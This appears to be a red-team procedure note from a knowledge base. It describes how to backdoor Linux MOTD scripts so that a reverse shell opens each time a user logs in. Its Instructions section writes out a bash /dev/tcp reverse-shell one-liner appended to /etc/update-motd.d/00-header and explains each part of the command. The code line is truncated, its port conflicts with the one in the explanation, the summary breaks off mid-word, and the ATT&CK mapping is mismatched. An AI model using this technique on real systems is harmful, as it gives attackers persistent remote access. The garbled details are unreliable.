---
id: 2c2874d7-524e-4289-b83d-47738cb1352b
name: Linux - Backdoor MOTD Persistence
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:18.043518+00:00'
updated_at: '2023-04-10T20:34:17.239239+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Hidden Users|T1147 - Hidden Users]]'
- '[[Hide Artifacts|T1564 - Hide Artifacts]]'
sub_techniques:
- '[[Hidden Files and Directories|T1564.001 - Hidden Files and Directories]]'
tags:
- '[[Backdooring Message of the Day]]'
- '[[Linux - Persistence]]'
---

# Linux - Backdoor MOTD Persistence

## Summary

The Backdooring Message of the Day (MOTD) technique involves modifying the MOTD file to execute a reverse shell when a user logs in. This allows an attacker to maintain persistence on the compromised Linux system. The attacker can then use this foothold to perform a variety of actions, such as stea

## Description

# Description

The Backdooring Message of the Day (MOTD) technique involves modifying the MOTD file to execute a reverse shell when a user logs in. This allows an attacker to maintain persistence on the compromised Linux system. The attacker can then use this foothold to perform a variety of actions, such as stealing sensitive data or launching further attacks.

To execute this technique, the attacker must modify the MOTD file to include a command that will establish a reverse shell connection to the attacker's system. This can be accomplished using a variety of methods, such as adding a line to the MOTD file that executes a bash script, or by modifying the MOTD file to include a command that will download and execute a malicious script.

This technique can be particularly effective because the MOTD file is executed every time a user logs in, so the attacker's code will be executed every time the system is accessed.

 

## Requirements

1. Access to the target Linux system

1. Ability to modify the MOTD file

1. Ability to establish a reverse shell connection

 

## Defense

1. Regularly monitor the MOTD file for any unauthorized changes

1. Implement strict file permissions on the MOTD file

1. Implement network segmentation to limit lateral movement

 

## Objectives

1. Establish persistence on a compromised Linux system

1. Maintain access to the compromised system for extended periods of time

1. Execute further attacks on the compromised system

 

# Instructions

1. This command appends a reverse shell one-liner to the 00-header file in the /etc/update-motd.d/ directory. When the file is executed, it will establish a reverse shell connection to the specified IP address and port.

 



**Code**: [[echo 'bash -c "bash -i >& /dev/tcp/10.10.10.10/444]]



> The `echo` command is used to write the reverse shell one-liner to the 00-header file. The one-liner uses `bash -c` to execute a new instance of the Bash shell with the `-i` option to enable interactive mode. The `>& /dev/tcp/10.10.10.10/4444` portion redirects the standard output and standard error streams to the specified IP address and port using the TCP protocol. The `0>&1` portion redirects the standard input stream to the standard output stream, which allows the attacker to interact with the remote shell. Finally, the `>> /etc/update-motd.d/00-header` portion appends the one-liner to the end of the 00-header file, which is executed every time a user logs in to the system.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Hidden Users|T1147 - Hidden Users]]
- [[Hide Artifacts|T1564 - Hide Artifacts]]

### Sub-Techniques

- [[Hidden Files and Directories|T1564.001 - Hidden Files and Directories]]

## Tags

- [[Backdooring Message of the Day]]
- [[Linux - Persistence]]


